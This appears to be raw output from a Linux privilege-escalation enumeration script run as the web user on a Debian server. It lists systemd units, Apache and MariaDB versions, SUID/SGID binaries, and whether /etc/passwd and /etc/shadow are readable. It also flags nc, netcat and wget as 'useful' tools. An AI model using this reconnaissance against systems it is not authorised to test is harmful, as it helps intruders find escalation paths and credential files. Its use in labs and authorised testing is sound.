-rw-r--r-- 1 root root  497 Jun 13  2018 systemd-exit.service
-rw-r--r-- 1 root root  674 Jun 13  2018 systemd-fsck-root.service
-rw-r--r-- 1 root root  675 Jun 13  2018 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Jun 13  2018 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Jun 13  2018 systemd-fsckd.socket
-rw-r--r-- 1 root root  544 Jun 13  2018 systemd-halt.service
-rw-r--r-- 1 root root  631 Jun 13  2018 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Jun 13  2018 systemd-hibernate.service
-rw-r--r-- 1 root root  930 Jun 13  2018 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Jun 13  2018 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Jun 13  2018 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Jun 13  2018 systemd-initctl.service
-rw-r--r-- 1 root root  524 Jun 13  2018 systemd-initctl.socket
-rw-r--r-- 1 root root  731 Jun 13  2018 systemd-journal-flush.service
-rw-r--r-- 1 root root  607 Jun 13  2018 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Jun 13  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1.5K Jun 13  2018 systemd-journald.service
-rw-r--r-- 1 root root  842 Jun 13  2018 systemd-journald.socket
-rw-r--r-- 1 root root  557 Jun 13  2018 systemd-kexec.service
-rw-r--r-- 1 root root  911 Jun 13  2018 systemd-localed.service
-rw-r--r-- 1 root root 1.4K Jun 13  2018 systemd-logind.service
-rw-r--r-- 1 root root  693 Jun 13  2018 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Jun 13  2018 systemd-modules-load.service
-rw-r--r-- 1 root root  685 Jun 13  2018 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.5K Jun 13  2018 systemd-networkd.service
-rw-r--r-- 1 root root  591 Jun 13  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  553 Jun 13  2018 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Jun 13  2018 systemd-quotacheck.service
-rw-r--r-- 1 root root  752 Jun 13  2018 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Jun 13  2018 systemd-reboot.service
-rw-r--r-- 1 root root  757 Jun 13  2018 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.5K Jun 13  2018 systemd-resolved.service
-rw-r--r-- 1 root root  696 Jun 13  2018 systemd-rfkill.service
-rw-r--r-- 1 root root  617 Jun 13  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  497 Jun 13  2018 systemd-suspend.service
-rw-r--r-- 1 root root  653 Jun 13  2018 systemd-sysctl.service
-rw-r--r-- 1 root root  868 Jun 13  2018 systemd-timedated.service
-rw-r--r-- 1 root root 1.3K Jun 13  2018 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Jun 13  2018 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 Jun 13  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  703 Jun 13  2018 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Jun 13  2018 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  823 Jun 13  2018 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Jun 13  2018 systemd-udev-trigger.service
-rw-r--r-- 1 root root  595 Jun 13  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Jun 13  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  968 Jun 13  2018 systemd-udevd.service
-rw-r--r-- 1 root root  757 Jun 13  2018 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Jun 13  2018 systemd-update-utmp.service
-rw-r--r-- 1 root root  588 Jun 13  2018 systemd-user-sessions.service
-rw-r--r-- 1 root root  395 Jun 13  2018 time-sync.target
-rw-r--r-- 1 root root  405 Jun 13  2018 timers.target
lrwxrwxrwx 1 root root   21 Jun 13  2018 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  417 Jun 13  2018 umount.target
lrwxrwxrwx 1 root root    9 Jun 13  2018 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 13  2018 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Jun 13  2018 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  392 Jun 13  2018 user.slice
-rw-r--r-- 1 root root  548 Jun 13  2018 user@.service
lrwxrwxrwx 1 root root    9 Jun 13  2018 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  528 Apr  5  2018 apache-htcacheclean.service
-rw-r--r-- 1 root root  537 Apr  5  2018 apache-htcacheclean@.service
-rw-r--r-- 1 root root  346 Apr  5  2018 apache2.service
-rw-r--r-- 1 root root  418 Apr  5  2018 apache2@.service
-rw-r--r-- 1 root root  366 Mar  2  2018 dbus.service
-rw-r--r-- 1 root root  106 Mar  2  2018 dbus.socket
-rw-r--r-- 1 root root  445 Mar  1  2018 ssh.service
-rw-r--r-- 1 root root  216 Mar  1  2018 ssh.socket
-rw-r--r-- 1 root root  196 Mar  1  2018 ssh@.service
-rw-r--r-- 1 root root  251 Oct  7  2017 cron.service
-rw-r--r-- 1 root root  238 Sep 13  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Sep 13  2017 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  225 Sep 13  2017 apt-daily.service
-rw-r--r-- 1 root root  156 Sep 13  2017 apt-daily.timer
-rw-r--r-- 1 root root 4.4K Aug 10  2017 mariadb.service
-rw-r--r-- 1 root root 5.5K Aug 10  2017 mariadb@.service
-rw-r--r-- 1 root root  306 Jul 25  2017 open-vm-tools.service
-rw-r--r-- 1 root root  298 Jul 25  2017 vgauth.service
drwxr-xr-x 2 root root 4.0K Jul  5  2017 busnames.target.wants
drwxr-xr-x 2 root root 4.0K Jul  5  2017 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Jul  5  2017 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Jul  5  2017 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Jul  5  2017 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Jul  5  2017 runlevel5.target.wants
-rw-r--r-- 1 root root  333 Mar 10  2017 irqbalance.service
-rw-r--r-- 1 root root  290 Jan 18  2017 rsyslog.service
-rw-r--r-- 1 root root  552 Jan 10  2017 ifup@.service
-rw-r--r-- 1 root root  175 Jan  1  2017 phpsessionclean.service
-rw-r--r-- 1 root root  144 Jan  1  2017 phpsessionclean.timer
-rw-r--r-- 1 root root  735 Oct 19  2016 networking.service
-rw-r--r-- 1 root root  312 May 20  2016 console-setup.service
-rw-r--r-- 1 root root  287 May 19  2016 keyboard-setup.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Jun 13  2018 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Jun 13  2018 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Jun 13  2018 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Jun 13  2018 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Jun 13  2018 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Jun 13  2018 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Mar  2  2018 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Jun 13  2018 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Jun 13  2018 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Jun 13  2018 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Jun 13  2018 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Jun 13  2018 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Jun 13  2018 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Jun 13  2018 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Jun 13  2018 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Jun 13  2018 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Jun 13  2018 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Jun 13  2018 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Jun 13  2018 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Jun 13  2018 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Jun 13  2018 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Jun 13  2018 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Jun 13  2018 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Jun 13  2018 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Jun 13  2018 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Jun 13  2018 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Jun 13  2018 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Jun 13  2018 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Jun 13  2018 systemd-update-utmp.service -> ../systemd-update-utmp.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Jun 13  2018 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jun 13  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Jun 13  2018 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jun 13  2018 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Jun 13  2018 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Jun 13  2018 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Jun 13  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Jun 13  2018 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Mar  2  2018 dbus.service -> ../dbus.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jun 13  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Jun 13  2018 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 551 Jun 13  2018 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Jun 13  2018 disable-with-time-daemon.conf

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jun 13  2018 debian.conf

/lib/systemd/system/mariadb@bootstrap.service.d:
total 4.0K
-rw-r--r-- 1 root root 533 Aug  9  2017 use_galera_new_cluster.conf

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 605 Jun 13  2018 80-container-host0.network
-rw-r--r-- 1 root root 678 Jun 13  2018 80-container-ve.network
-rw-r--r-- 1 root root 664 Jun 13  2018 80-container-vz.network
-rw-r--r-- 1 root root  80 Jun 13  2018 99-default.link

/lib/systemd/system-generators:
total 192K
-rwxr-xr-x 1 root root 23K Jun 13  2018 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root 15K Jun 13  2018 systemd-debug-generator
-rwxr-xr-x 1 root root 31K Jun 13  2018 systemd-fstab-generator
-rwxr-xr-x 1 root root 15K Jun 13  2018 systemd-getty-generator
-rwxr-xr-x 1 root root 35K Jun 13  2018 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root 11K Jun 13  2018 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root 11K Jun 13  2018 systemd-rc-local-generator
-rwxr-xr-x 1 root root 11K Jun 13  2018 systemd-system-update-generator
-rwxr-xr-x 1 root root 31K Jun 13  2018 systemd-sysv-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 923 Jun 13  2018 90-systemd.preset

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Jan 24  2017 hdparm

/lib/systemd/system-shutdown:
total 0


[00;33m### SOFTWARE #############################################[00m
[00;31m[-] MYSQL version:[00m
mysql  Ver 15.1 Distrib 10.1.26-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2


[00;31m[-] Apache version:[00m
Server version: Apache/2.4.25 (Debian)
Server built:   2018-06-02T08:01:13


[00;31m[-] Apache user configuration:[00m
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[00;31m[-] Installed Apache modules:[00m
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 setenvif_module (shared)
 status_module (shared)


[00;33m### INTERESTING FILES ####################################[00m
[00;31m[-] Useful file locations:[00m
/bin/nc
/bin/netcat
/usr/bin/wget


[00;31m[-] Can we read/write sensitive files:[00m
-rw-r--r-- 1 root root 1450 Jun 27  2018 /etc/passwd
-rw-r--r-- 1 root root 681 Jun 27  2018 /etc/group
-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
-rw-r----- 1 root shadow 961 Jun 27  2018 /etc/shadow


[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 26  2018 /bin/fusermount
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 440728 Aug 21 05:14 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd


[00;31m[-] SGID files:[00m
-rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd
-rwxr-sr-x 1 root ssh 358624 Aug 21 05:14 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 19008 Jan 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 71856 May 17  2017 /usr/bin/chage
-rwxr-sr-x 1 root crontab 40264 Oct  7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27448 Mar  7  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 22808 May 17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
-rw-r--r-- 1 root root 599 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 1963 Jan 18  2017 /etc/rsyslog.conf
-rw-r--r-- 1 root root 4781 Jan 24  2017 /etc/hdparm.conf
-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
-rw-r--r-- 1 root root 552 May 27  2017 /etc/pam.conf
-rw-r--r-- 1 root root 8384 Oct 28 16:37 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 191 Apr 12  2017 /etc/libaudit.conf
-rw-r--r-- 1 root root 2969 May 21  2017 /etc/debconf.conf
-rw-r--r-- 1 root root 280 Jul 26  2018 /etc/fuse.conf
-rw-r--r-- 1 root root 3173 Mar  2  2018 /etc/reportbug.conf
-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
-rw-r--r-- 1 root root 497 Jun 15  2017 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2981 Jun 27  2018 /etc/adduser.conf
-rw-r--r-- 1 root root 2683 Nov 22  2016 /etc/sysctl.conf
-rw-r--r-- 1 root root 2584 Aug  2  2016 /etc/gai.conf
-rw-r--r-- 1 root root 346 Nov 30  2016 /etc/discover-modprobe.conf
-rw-r--r-- 1 root root 49 Oct 28 16:23 /etc/resolv.conf
-rw-r--r-- 1 root root 34 Apr  9  2017 /etc/ld.so.conf
-rw-r--r-- 1 root root 973 Feb  1  2017 /etc/mke2fs.conf
-rw-r--r-- 1 root root 144 Jun 27  2018 /etc/kernel-img.conf


[00;31m[-] Current user's history files:[00m
-rw------- 1 www-data www-data 1 Nov  4 19:50 /var/www/.bash_history


[00;31m[-] Any interesting mail in /var/mail:[00m
total 8
drwxrwsr-x  2 root mail 4096 Jun 27  2018 .
drwxr-xr-x 12 root root 4096 Jun 27  2018 ..


[00;33m### SCAN COMPLETE ####################################[00m
